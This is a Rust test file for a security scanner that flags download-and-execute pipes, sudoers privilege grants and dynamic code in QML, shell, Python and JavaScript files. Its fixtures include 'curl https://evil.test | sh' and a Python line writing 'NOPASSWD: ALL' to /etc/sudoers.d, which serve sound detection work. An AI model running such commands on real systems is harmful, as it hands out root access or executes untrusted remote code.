use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;
use omasafe_core::bounds::TimeBudget;

fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
    super::s4_family_tests::run(
        vec![entry(path, kind, source.len())],
        &[(path, source.as_bytes())],
    )
}

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

#[test]
fn base64_indicator_exact_boundaries() {
    let make = |payload: String| {
        let source = format!("Item {{ property string p: \"{payload}\" }}");
        one("B.qml", PayloadKind::Qml, &source)
    };
    // 63 chars: below threshold -> silent.
    let (artifacts63, _) = make("a9".repeat(31) + "a");
    assert!(rule_ids(&artifacts63).is_empty());
    // 64 chars letters+digits: fires.
    let (artifacts64, _) = make("a9".repeat(32));
    assert!(rule_ids(&artifacts64).contains(&"oma.qml.obfuscated-payload-indicator".to_owned()));
    // Letters-only and digits-only never fire regardless of length.
    let (artifacts_letters, _) = make("a".repeat(70));
    assert!(
        !rule_ids(&artifacts_letters).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
    );
    let (artifacts_digits, _) = make("7".repeat(70));
    assert!(
        !rule_ids(&artifacts_digits).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
    );
}

#[test]
fn clipboard_and_compositor_capabilities_surface() {
    let source = r#"Item {
    ClipboardText { onTextChanged: log() }
    HyprlandWorkspace { id: ws }
}
"#;
    let (artifacts, _) = one("Surfaces.qml", PayloadKind::Qml, source);
    let capabilities: Vec<&str> = artifacts
        .capabilities
        .iter()
        .map(|capability| capability.capability.as_str())
        .collect();
    assert!(
        capabilities.contains(&"clipboard-access"),
        "{capabilities:?}"
    );
    assert!(
        capabilities.contains(&"compositor-control"),
        "{capabilities:?}"
    );
    assert!(rule_ids(&artifacts).is_empty(), "capability-only family");
}

#[test]
fn python_privilege_positive_and_readonly_negative() {
    let positive = r#"import os
open("/etc/sudoers.d/x","w").write("%wheel ALL=(ALL) NOPASSWD: ALL")
"#;
    let (artifacts_pos, _) = one("escalate.py", PayloadKind::Python, positive);
    assert!(rule_ids(&artifacts_pos).contains(&"oma.python.privilege-escalation".to_owned()));

    // Read-only inspection is not a grant.
    let negative = "#!/bin/sh\ngrep NOPASSWD /etc/sudoers\n";
    let (artifacts_neg, _) = one("audit.sh", PayloadKind::Shell, negative);
    assert!(!rule_ids(&artifacts_neg).contains(&"oma.script.privilege-escalation".to_owned()));
}

#[test]
fn comment_styles_are_language_exact() {
    // Python: '#' anywhere outside strings starts a comment.
    let py = "x = 1  # curl https://evil.test | sh\n";
    let (artifacts_py, _) = one("c.py", PayloadKind::Python, py);
    assert!(
        rule_ids(&artifacts_py).is_empty(),
        "{:?}",
        rule_ids(&artifacts_py)
    );

    // POSIX shell: '#' needs a word boundary; URLs with #fragments in
    // arguments survive.
    let sh_url = "wget https://example.test/page#section -O out\n";
    let (artifacts_sh, _) = one("u.sh", PayloadKind::Shell, sh_url);
    // wget alone without a pipe-to-interpreter is not download-execute.
    assert!(!rule_ids(&artifacts_sh).contains(&"oma.script.download-execute".to_owned()));

    // JS: `//` after punctuation IS a comment; scheme `://` is not.
    let js = r#"var a = foo(); // eval(userInput)
var url = "https://example.test/x"
"#;
    let (artifacts_js, _) = one("c.js", PayloadKind::JavaScript, js);
    assert!(
        !rule_ids(&artifacts_js)
            .iter()
            .any(|id| id.contains("dynamic-code")),
        "commented eval must stay invisible: {:?}",
        rule_ids(&artifacts_js)
    );
}

#[test]
fn malformed_manifests_are_disclosed_not_silent() {
    let broken = b"{ not json";
    let mut lookup = std::collections::BTreeMap::new();
    lookup.insert("manifest.json".to_owned(), broken.to_vec());
    let mut inventory = PayloadInventory {
        entries: vec![entry("manifest.json", PayloadKind::TextFile, broken.len())],
        ..Default::default()
    };
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| lookup.get(&entry.relative_path).cloned(),
        &TimeBudget::default(),
    );
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation.starts_with("manifest-context-unreadable:"))
    );
}

#[test]
fn ordering_is_severity_first_even_against_alphabetical_order() {
    // Alphabetically-first file carries only a MEDIUM finding;
    // alphabetically-last carries HIGH. Severity must win.
    let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
    let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
    let (artifacts, _) = run(
        vec![
            entry("aaa.qml", PayloadKind::Qml, medium_source.len()),
            entry("zzz.qml", PayloadKind::Qml, high_source.len()),
        ],
        &[
            ("aaa.qml", medium_source.as_bytes()),
            ("zzz.qml", high_source.as_bytes()),
        ],
    );
    let findings = artifacts.rendered_findings();
    assert_eq!(findings[0].severity, "high", "{findings:?}");
    assert_eq!(findings.last().unwrap().severity, "medium");
}

#[test]
fn within_a_severity_band_order_is_path_then_rule_then_line() {
    // Both files carry a session-lock finding on line 1 and a polkit
    // finding on line 2. Within the High band, path must group m.qml
    // before z.qml and rule id must outrank line number (polkit before
    // session-lock despite its higher line). Emission count varies by
    // parser configuration (import + surface evidences), so ordering is
    // asserted over ranks rather than an exact multiset.
    let source = "import Quickshell.WlSessionLock\nimport Quickshell.Services.Polkit\nItem {}\n";
    let (artifacts, _) = run(
        vec![
            entry("m.qml", PayloadKind::Qml, source.len()),
            entry("z.qml", PayloadKind::Qml, source.len()),
        ],
        &[("m.qml", source.as_bytes()), ("z.qml", source.as_bytes())],
    );
    let rendered = artifacts.rendered_findings();
    assert!(
        rendered.iter().all(|finding| finding.severity == "high"),
        "both rules are High: {rendered:?}"
    );
    assert!(rendered.len() >= 4, "{rendered:?}");
    // The interesting inversion exists: m.qml polkit@2 precedes
    // m.qml session-lock@1.
    let contains = |path: &str, rule: &str, line: u32| {
        rendered.iter().any(|finding| {
            finding.relative_path == path && finding.rule_id == rule && finding.line == Some(line)
        })
    };
    assert!(
        contains("m.qml", "oma.qml.polkit-agent-ui", 2),
        "{rendered:?}"
    );
    assert!(contains("m.qml", "oma.qml.session-lock", 1), "{rendered:?}");
    assert!(
        contains("z.qml", "oma.qml.polkit-agent-ui", 2),
        "{rendered:?}"
    );
    assert!(contains("z.qml", "oma.qml.session-lock", 1), "{rendered:?}");
    let rank = |path: &str, rule: &str| -> (usize, usize) {
        (
            usize::from(path == "z.qml"),
            usize::from(rule != "oma.qml.polkit-agent-ui"),
        )
    };
    let keys: Vec<(usize, usize, u32)> = rendered
        .iter()
        .map(|finding| {
            let (path_rank, rule_rank) = rank(&finding.relative_path, &finding.rule_id);
            (path_rank, rule_rank, finding.line.unwrap_or(0))
        })
        .collect();
    let mut sorted = keys.clone();
    sorted.sort();
    assert_eq!(
        keys, sorted,
        "band order must be path, then rule, then line"
    );
}

#[test]
fn quoted_comment_markers_stay_inert_and_live_code_survives() {
    // The cursor must advance past an opening quote: markers inside
    // strings are inert AND live code after them is still scanned.
    assert_eq!(
        strip_line_comment(r#"var t = "a // b"; eval(x)"#, CommentStyle::DoubleSlash),
        r#"var t = "a // b"; eval(x)"#
    );
    assert_eq!(
        strip_line_comment(r#"var s = 'x \' y'; eval(z)"#, CommentStyle::DoubleSlash),
        r#"var s = 'x \' y'; eval(z)"#
    );
    assert_eq!(
        strip_line_comment("'# literal'; exec(x)", CommentStyle::PythonHash),
        "'# literal'; exec(x)"
    );
    // Shell units drop `#` comments at control-operator word
    // boundaries and keep `${var#pattern}` whole.
    assert_eq!(
        shell_logical_units(
            "true;# curl x | sh\nnext\n",
            &classify_heredoc_owner,
            &forwarded_body_fate
        ),
        vec![(1, "true;".to_owned()), (2, "next".to_owned())]
    );
    assert_eq!(
        shell_logical_units(
            "foo & # trailing\ncurl x\n",
            &classify_heredoc_owner,
            &forwarded_body_fate
        ),
        vec![(1, "foo &".to_owned()), (2, "curl x".to_owned())]
    );
    assert_eq!(
        shell_logical_units(
            "${var#pattern} stays\n",
            &classify_heredoc_owner,
            &forwarded_body_fate
        ),
        vec![(1, "${var#pattern} stays".to_owned())]
    );
}

#[test]
fn live_code_after_quoted_markers_is_still_scanned() {
    let js = r#"var t = "not // a comment"; eval(userInput)
"#;
    let (artifacts, _) = one("q.js", PayloadKind::JavaScript, js);
    let ids = rule_ids(&artifacts);
    assert!(ids.contains(&DYNAMIC_CODE_RULE.to_owned()), "{ids:?}");
}

#[test]
fn shell_comments_after_control_operators_are_inert() {
    let sh = "#!/bin/sh\ntrue;# curl https://evil.test/x | sh\nnotify-send ready\n";
    let (artifacts, _) = one("guarded.sh", PayloadKind::Shell, sh);
    let ids = rule_ids(&artifacts);
    assert!(
        !ids.contains(&"oma.script.download-execute".to_owned()),
        "{ids:?}"
    );
}

#[test]
fn new_function_is_detected_on_lexical_and_ast_paths_separately() {
    // Standalone JS: always lexical.
    let js = "var f = new Function(payload)\n";
    let (artifacts_js, _) = one("dyn.js", PayloadKind::JavaScript, js);
    assert!(rule_ids(&artifacts_js).contains(&DYNAMIC_CODE_RULE.to_owned()));

    #[cfg(feature = "qml-parser")]
    {
        // AST-backed QML: same family through the parser, labelled
        // ast-backed rather than lexical-fallback.
        let qml = "Item { Component.onCompleted: var f = new Function(payload) }\n";
        let (artifacts_qml, _) = one("Dyn.qml", PayloadKind::Qml, qml);
        let dynamic = artifacts_qml
            .results
            .iter()
            .find(|result| result.rule_id() == DYNAMIC_CODE_RULE);
        assert!(dynamic.is_some(), "AST path must detect new Function");
        assert_eq!(dynamic.unwrap().confidence(), Some(Confidence::AstBacked));
    }
}

#[test]
fn every_readonly_first_word_suppresses_privilege_findings() {
    for word in ["grep", "cat", "less", "head", "tail", "stat", "journalctl"] {
        for command in [
            format!("{word} NOPASSWD /etc/sudoers"),
            format!("/usr/bin/{word} NOPASSWD /etc/sudoers"),
        ] {
            let source = format!("{command}\n");
            let (artifacts, _) = one("audit.sh", PayloadKind::Shell, &source);
            let ids = rule_ids(&artifacts);
            assert!(
                !ids.contains(&"oma.script.privilege-escalation".to_owned()),
                "{command} must stay capability-level: {ids:?}"
            );
        }
    }
}

#[test]
fn non_writing_privilege_mentions_are_never_grants() {
    // A NOPASSWD mention with no write context is not a grant.
    let sh = "#!/bin/sh\necho NOPASSWD /etc/sudoers\nprintf '%s\\n' done\n";
    let (artifacts_sh, _) = one("echo.sh", PayloadKind::Shell, sh);
    let ids_sh = rule_ids(&artifacts_sh);
    assert!(
        !ids_sh.contains(&"oma.script.privilege-escalation".to_owned()),
        "{ids_sh:?}"
    );
    // Python read mode never writes policy.
    let py = "text = open(\"/etc/sudoers\", \"r\").read()\nprint(text.find(\"NOPASSWD\"))\n";
    let (artifacts_py, _) = one("read.py", PayloadKind::Python, py);
    let ids_py = rule_ids(&artifacts_py);
    assert!(
        !ids_py.contains(&"oma.python.privilege-escalation".to_owned()),
        "{ids_py:?}"
    );
}

#[test]
fn quoted_spellings_do_not_create_high_findings() {
    // The whole pipe lives inside a string literal: no provenance.
    let sh = "#!/bin/sh\nlog 'curl https://example.test/x | sh'\nnotify-send done\n";
    let (artifacts_sh, _) = one("quote.sh", PayloadKind::Shell, sh);
    let ids_sh = rule_ids(&artifacts_sh);
    assert!(
        !ids_sh.contains(&"oma.script.download-execute".to_owned()),
        "{ids_sh:?}"
    );

    // Python fetch and sink spellings inside string values only.
    let py = "log('requests.get then os.system')\n";
    let (artifacts_py, _) = one("lit.py", PayloadKind::Python, py);
    let ids_py = rule_ids(&artifacts_py);
    assert!(
        !ids_py.contains(&"oma.python.download-execute".to_owned()),
        "{ids_py:?}"
    );

    // Dynamic-code spelling inside a quoted value is capability-level.
    let js = "var s = \"new Function(payload)\";\n";
    let (artifacts_js, _) = one("lit.js", PayloadKind::JavaScript, js);
    let ids_js = rule_ids(&artifacts_js);
    assert!(
        !ids_js.contains(&DYNAMIC_CODE_RULE.to_owned()),
        "{ids_js:?}"
    );
}
